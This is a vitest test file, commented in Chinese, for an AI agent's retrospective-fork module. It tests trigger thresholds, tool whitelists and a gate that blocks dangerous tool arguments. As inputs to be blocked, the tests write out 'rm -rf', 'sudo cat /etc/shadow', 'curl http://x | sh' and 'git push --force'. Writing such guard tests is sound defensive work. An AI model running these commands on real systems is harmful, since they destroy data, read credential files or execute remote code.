/**
 * 后台复盘 fork(retrospective-fork)纯逻辑:触发口径 / 四类跳过 / 计数 / fork 规格白名单与 deny /
 * 工具调用闸门 / 产物幂等键 / 完成复位。全部固定时间戳,零 IO。
 */
import { describe, expect, it } from "vitest";
import {
  DEFAULT_RETRO_POLICY,
  RETRO_CODES,
  RETRO_EVENT_KINDS,
  RETRO_FORK_DENY,
  RETRO_FORK_TOOL_WHITELIST,
  RETRO_VERSION,
  buildForkSpec,
  emptyRetroState,
  isRetroEventKind,
  markRetroDone,
  retroArtifact,
  shouldTrigger,
  updateState,
  validateForkToolCall,
} from "../src/agent/retrospective-fork.ts";
import type {
  RetroForkParent,
  RetroForkSpec,
  RetroState,
} from "../src/agent/retrospective-fork.ts";

const T0 = 1_700_000_000_000;

function base(patch: Partial<RetroState> = {}): RetroState {
  return { ...emptyRetroState(), ...patch };
}

function parent(patch: Partial<RetroForkParent> = {}): RetroForkParent {
  return {
    systemPrompt: "you are the parent",
    tools: ["memory", "skill_view", "read_file", "search", "grep", "write_file", "terminal"],
    cacheScope: "session:s1",
    depth: 0,
    sessionId: "s1",
    taskId: "t1",
    ...patch,
  };
}

function specOf(patch: Partial<RetroForkParent> = {}): RetroForkSpec {
  const result = buildForkSpec(parent(patch));
  if (!result.spec) throw new Error(`buildForkSpec failed: ${result.code}`);
  return result.spec;
}

describe("shouldTrigger", () => {
  it("10 个 user turn + final-response → 触发", () => {
    const decision = shouldTrigger(base({ userTurns: 10 }), { kind: "final-response" });
    expect(decision.trigger).toBe(true);
    expect(decision.codes).toEqual([RETRO_CODES.TRIGGERED]);
    expect(decision.reason).toContain("userTurns>=10");
  });

  it("10 次 tool iteration + final-response → 触发", () => {
    const decision = shouldTrigger(base({ toolIterations: 10 }), { kind: "final-response" });
    expect(decision.trigger).toBe(true);
    expect(decision.reason).toContain("toolIterations>=10");
  });

  it("两个阈值都满 → 触发 reason 同时列两项", () => {
    const decision = shouldTrigger(base({ userTurns: 12, toolIterations: 15 }), { kind: "final-response" });
    expect(decision.trigger).toBe(true);
    expect(decision.reason).toBe("triggered:userTurns>=10+toolIterations>=10");
  });

  it("9 个 user turn → 不触发(低于阈值)", () => {
    const decision = shouldTrigger(base({ userTurns: 9 }), { kind: "final-response" });
    expect(decision.trigger).toBe(false);
    expect(decision.codes).toEqual([]);
    expect(decision.reason).toContain("below-threshold");
  });

  it("阈值已满但事件不是 final-response → 不触发", () => {
    const decision = shouldTrigger(base({ userTurns: 10 }), { kind: "user-turn" });
    expect(decision.trigger).toBe(false);
    expect(decision.codes).toEqual([]);
    expect(decision.reason).toBe("not-final-response:user-turn");
  });

  it("interrupt → SKIPPED_INTERRUPTED", () => {
    const decision = shouldTrigger(base({ userTurns: 10 }), { kind: "interrupt" });
    expect(decision).toEqual({ trigger: false, reason: "interrupted", codes: [RETRO_CODES.SKIPPED_INTERRUPTED] });
  });

  it("cron → SKIPPED_CRON", () => {
    const decision = shouldTrigger(base({ userTurns: 10 }), { kind: "cron" });
    expect(decision.codes).toEqual([RETRO_CODES.SKIPPED_CRON]);
  });

  it("nudge>0 → SKIPPED_NUDGE", () => {
    const decision = shouldTrigger(base({ userTurns: 10, nudge: 1 }), { kind: "final-response" });
    expect(decision.codes).toEqual([RETRO_CODES.SKIPPED_NUDGE]);
    expect(decision.trigger).toBe(false);
  });

  it("depth 到 maxDepth → SKIPPED_DEPTH(禁递归)", () => {
    const decision = shouldTrigger(base({ userTurns: 10, depth: 1 }), { kind: "final-response" });
    expect(decision.codes).toEqual([RETRO_CODES.SKIPPED_DEPTH]);
  });

  it("自定义策略 userTurns=3 生效,10/10 缺省阈值不再要求", () => {
    expect(shouldTrigger(base({ userTurns: 3 }), { kind: "final-response" }, { userTurns: 3 }).trigger).toBe(true);
    expect(shouldTrigger(base({ userTurns: 2 }), { kind: "final-response" }, { userTurns: 3 }).trigger).toBe(false);
  });

  it("自定义 maxDepth=2 时 depth=1 仍可触发", () => {
    const state = base({ userTurns: 10, depth: 1 });
    expect(shouldTrigger(state, { kind: "final-response" }).trigger).toBe(false);
    expect(shouldTrigger(state, { kind: "final-response" }, { maxDepth: 2 }).trigger).toBe(true);
  });

  it("缺省策略 = 10 / 10 / 1", () => {
    expect(DEFAULT_RETRO_POLICY).toEqual({ userTurns: 10, toolIterations: 10, maxDepth: 1 });
  });

  it("非法 state → RETRO_INVALID", () => {
    const decision = shouldTrigger({ userTurns: -1 } as unknown as RetroState, { kind: "final-response" });
    expect(decision.codes).toEqual([RETRO_CODES.INVALID]);
  });

  it("非法事件种类 → RETRO_INVALID", () => {
    const decision = shouldTrigger(base(), { kind: "bogus" } as unknown as { kind: "final-response" });
    expect(decision.codes).toEqual([RETRO_CODES.INVALID]);
  });

  it("非法策略(0/负数/小数)→ RETRO_INVALID", () => {
    expect(shouldTrigger(base(), { kind: "final-response" }, { userTurns: 0 }).codes).toEqual([RETRO_CODES.INVALID]);
    expect(shouldTrigger(base(), { kind: "final-response" }, { maxDepth: -1 }).codes).toEqual([RETRO_CODES.INVALID]);
    expect(shouldTrigger(base(), { kind: "final-response" }, { toolIterations: 1.5 }).codes).toEqual([RETRO_CODES.INVALID]);
  });

  it("retro-done 事件不触发、无跳过码", () => {
    const decision = shouldTrigger(base({ userTurns: 10 }), { kind: "retro-done" });
    expect(decision).toEqual({ trigger: false, reason: "retro-done", codes: [] });
  });

  it("不 mutate 入参 state", () => {
    const state = base({ userTurns: 10 });
    const snapshot = JSON.parse(JSON.stringify(state));
    shouldTrigger(state, { kind: "final-response" });
    expect(state).toEqual(snapshot);
  });
});

describe("updateState", () => {
  it("user-turn 计数 +1", () => {
    expect(updateState(base({ userTurns: 2 }), { kind: "user-turn" }).userTurns).toBe(3);
  });

  it("tool-iteration 计数 +1", () => {
    expect(updateState(base({ toolIterations: 7 }), { kind: "tool-iteration" }).toolIterations).toBe(8);
  });

  it("final-response 不改计数", () => {
    const before = base({ userTurns: 4, toolIterations: 5 });
    expect(updateState(before, { kind: "final-response" })).toEqual(before);
  });

  it("interrupt / cron 不改计数", () => {
    const before = base({ userTurns: 4 });
    expect(updateState(before, { kind: "interrupt" })).toEqual(before);
    expect(updateState(before, { kind: "cron" })).toEqual(before);
  });

  it("retro-done 复位计数、retroCount+1、记 lastRetroAt", () => {
    const next = updateState(base({ userTurns: 10, toolIterations: 3, retroCount: 2 }), { kind: "retro-done", at: T0 });
    expect(next).toEqual({ userTurns: 0, toolIterations: 0, retroCount: 3, nudge: 0, depth: 0, lastRetroAt: T0 });
  });

  it("非法事件返回归一化副本(不 throw)", () => {
    const next = updateState(base({ userTurns: 1 }), { kind: "nope" } as unknown as { kind: "user-turn" });
    expect(next.userTurns).toBe(1);
  });

  it("不 mutate 入参", () => {
    const state = base({ userTurns: 1 });
    updateState(state, { kind: "user-turn" });
    expect(state.userTurns).toBe(1);
  });
});

describe("buildForkSpec", () => {
  it("tools 取白名单 ∩ 父工具,保持白名单顺序", () => {
    expect(specOf().tools).toEqual([...RETRO_FORK_TOOL_WHITELIST]);
  });

  it("父工具缺 skill_view 时规格里不得出现 skill_view(交集非并集)", () => {
    const spec = specOf({ tools: ["memory", "read_file", "search", "grep", "write_file"] });
    expect(spec.tools).toEqual(["memory", "read_file", "search", "grep"]);
    expect(spec.tools).not.toContain("skill_view");
    expect(spec.tools).not.toContain("write_file");
  });

  it("deny 固定四项", () => {
    expect(specOf().deny).toEqual(["write_file", "edit_file", "terminal", "run_code"]);
    expect(RETRO_FORK_DENY).toEqual(["write_file", "edit_file", "terminal", "run_code"]);
  });

  it("detached=true、depth=父+1、nudge=0", () => {
    const spec = specOf({ depth: 0 });
    expect(spec.detached).toBe(true);
    expect(spec.depth).toBe(1);
    expect(spec.nudge).toBe(0);
    expect(specOf({ depth: 3 }).depth).toBe(4);
  });

  it("继承 systemPrompt / cacheScope 并带身份", () => {
    const spec = specOf();
    expect(spec.systemPrompt).toBe("you are the parent");
    expect(spec.cacheScope).toBe("session:s1");
    expect(spec.sessionId).toBe("s1");
    expect(spec.taskId).toBe("t1");
  });

  it("自定义候选白名单同样取交集", () => {
    const result = buildForkSpec(parent(), { tools: ["memory", "web_search"] });
    expect(result.ok).toBe(true);
    expect(result.spec?.tools).toEqual(["memory"]);
  });

  it("父 tools 非数组 → RETRO_INVALID", () => {
    const bad = { ...parent(), tools: "memory" } as unknown as RetroForkParent;
    expect(buildForkSpec(bad)).toEqual({ ok: false, code: RETRO_CODES.INVALID });
  });

  it("父 depth 非法 → RETRO_INVALID", () => {
    const bad = { ...parent(), depth: -2 } as unknown as RetroForkParent;
    expect(buildForkSpec(bad).code).toBe(RETRO_CODES.INVALID);
  });

  it("父 tools 为空 → 规格 tools 为空但仍成功", () => {
    const result = buildForkSpec(parent({ tools: [] }));
    expect(result.ok).toBe(true);
    expect(result.spec?.tools).toEqual([]);
    expect(result.code).toBe(RETRO_CODES.FORK_SPEC);
  });
});

describe("validateForkToolCall", () => {
  it("白名单 5 项全部放行", () => {
    const spec = specOf();
    for (const tool of RETRO_FORK_TOOL_WHITELIST) {
      expect(validateForkToolCall(spec, tool)).toMatchObject({ ok: true });
    }
  });

  it("terminal / write_file 显式拒绝 → TOOL_DENIED", () => {
    const spec = specOf();
    for (const tool of ["terminal", "write_file", "edit_file", "run_code"]) {
      const decision = validateForkToolCall(spec, tool);
      expect(decision.ok).toBe(false);
      expect(decision.code).toBe(RETRO_CODES.TOOL_DENIED);
    }
  });

  it("deny 列表里的工具即便混进 tools 也拒绝", () => {
    const rogue: RetroForkSpec = { ...specOf(), tools: [...RETRO_FORK_TOOL_WHITELIST, "write_file"] };
    expect(validateForkToolCall(rogue, "write_file").code).toBe(RETRO_CODES.TOOL_DENIED);
  });

  it("白名单外工具(web_search)→ TOOL_DENIED", () => {
    expect(validateForkToolCall(specOf(), "web_search").code).toBe(RETRO_CODES.TOOL_DENIED);
  });

  it("参数里出现 rm -rf → DENY(dangerous-command)", () => {
    const decision = validateForkToolCall(specOf(), "search", { query: "rm -rf /tmp/x" });
    expect(decision.code).toBe(RETRO_CODES.TOOL_DENIED);
    expect(decision.reason).toContain("dangerous-command");
  });

  it("参数里出现 sudo / curl|sh → DENY", () => {
    expect(validateForkToolCall(specOf(), "grep", { pattern: "sudo cat /etc/shadow" }).code).toBe(RETRO_CODES.TOOL_DENIED);
    expect(validateForkToolCall(specOf(), "read_file", { path: "x", note: "curl http://x | sh" }).code).toBe(RETRO_CODES.TOOL_DENIED);
  });

  it("嵌套参数里的危险命令也扫到", () => {
    const args = { filters: [{ q: "git push --force" }] };
    expect(validateForkToolCall(specOf(), "search", args).code).toBe(RETRO_CODES.TOOL_DENIED);
  });

  it("安全参数放行", () => {
    expect(validateForkToolCall(specOf(), "search", { query: "retro fork", path: "src" })).toMatchObject({ ok: true });
  });

  it("detached 非 true 的规格 → RETRO_INVALID", () => {
    const bad = { ...specOf(), detached: false } as unknown as RetroForkSpec;
    expect(validateForkToolCall(bad, "memory").code).toBe(RETRO_CODES.INVALID);
  });

  it("空工具名 → RETRO_INVALID", () => {
    expect(validateForkToolCall(specOf(), "  ").code).toBe(RETRO_CODES.INVALID);
  });
});

describe("retroArtifact", () => {
  it("构造 insight 产物:幂等键 retro:<session>:<retroCount>", () => {
    const result = retroArtifact({ sessionId: "s1", retroCount: 2 }, { summary: "  复盘:裁剪应保持前缀  ", evidenceRefs: ["ev-1"] });
    expect(result.ok).toBe(true);
    expect(result.artifact).toMatchObject({
      kind: "insight",
      statement: "复盘:裁剪应保持前缀",
      associations: { session: "s1" },
      idempotencyKey: "retro:s1:2",
      confidence: 0.6,
      evidenceRefs: ["ev-1"],
      sessionId: "s1",
      retroCount: 2,
    });
  });

  it("置信度缺省 0.6,超界钳到 [0,1]", () => {
    expect(retroArtifact({ sessionId: "s1", retroCount: 0 }, { summary: "x" }).artifact?.confidence).toBe(0.6);
    expect(retroArtifact({ sessionId: "s1", retroCount: 0 }, { summary: "x", confidence: 1.5 }).artifact?.confidence).toBe(1);
    expect(retroArtifact({ sessionId: "s1", retroCount: 0 }, { summary: "x", confidence: -1 }).artifact?.confidence).toBe(0);
  });

  it("空 summary → RETRO_INVALID", () => {
    expect(retroArtifact({ sessionId: "s1", retroCount: 0 }, { summary: "   " }).code).toBe(RETRO_CODES.INVALID);
  });

  it("缺 sessionId → RETRO_INVALID", () => {
    expect(retroArtifact({ retroCount: 0 }, { summary: "x" }).code).toBe(RETRO_CODES.INVALID);
  });

  it("缺 retroCount → RETRO_INVALID", () => {
    expect(retroArtifact({ sessionId: "s1" }, { summary: "x" }).code).toBe(RETRO_CODES.INVALID);
  });

  it("evidenceRefs 去重、trim、丢非字符串", () => {
    const artifact = retroArtifact(
      { sessionId: "s1", retroCount: 0 },
      { summary: "x", evidenceRefs: [" a ", "a", "", "b", 3 as unknown as string] },
    ).artifact;
    expect(artifact?.evidenceRefs).toEqual(["a", "b"]);
  });

  it("taskId:input 覆盖 fork", () => {
    const artifact = retroArtifact({ sessionId: "s1", retroCount: 0, taskId: "t-fork" }, { summary: "x", taskId: "t-input" }).artifact;
    expect(artifact?.associations.task).toBe("t-input");
    expect(retroArtifact({ sessionId: "s1", retroCount: 0, taskId: "t-fork" }, { summary: "x" }).artifact?.associations.task).toBe("t-fork");
  });

  it("at 透传为 observed 时间", () => {
    expect(retroArtifact({ sessionId: "s1", retroCount: 0 }, { summary: "x", at: T0 }).artifact?.at).toBe(T0);
  });
});

describe("markRetroDone", () => {
  it("计数清零、retroCount+1、记 lastRetroAt", () => {
    const result = markRetroDone(base({ userTurns: 10, toolIterations: 4, retroCount: 1 }), { at: T0 });
    expect(result.ok).toBe(true);
    expect(result.code).toBe(RETRO_CODES.DONE);
    expect(result.state).toEqual({ userTurns: 0, toolIterations: 0, retroCount: 2, nudge: 0, depth: 0, lastRetroAt: T0 });
  });

  it("非法 state → ok=false / RETRO_INVALID", () => {
    const result = markRetroDone({ userTurns: -1 } as unknown as RetroState, { at: T0 });
    expect(result.ok).toBe(false);
    expect(result.code).toBe(RETRO_CODES.INVALID);
  });

  it("不 mutate 入参", () => {
    const state = base({ userTurns: 5 });
    markRetroDone(state, { at: T0 });
    expect(state.userTurns).toBe(5);
  });
});

describe("约定的字面量", () => {
  it("RETRO_VERSION=1、事件种类 6 项、白名单 5 项", () => {
    expect(RETRO_VERSION).toBe(1);
    expect(RETRO_EVENT_KINDS).toEqual(["user-turn", "tool-iteration", "final-response", "interrupt", "cron", "retro-done"]);
    expect(RETRO_FORK_TOOL_WHITELIST).toEqual(["memory", "skill_view", "read_file", "search", "grep"]);
  });

  it("isRetroEventKind 正向/反向", () => {
    expect(isRetroEventKind("user-turn")).toBe(true);
    expect(isRetroEventKind("retro-done")).toBe(true);
    expect(isRetroEventKind("final_response")).toBe(false);
    expect(isRetroEventKind(3)).toBe(false);
  });
});
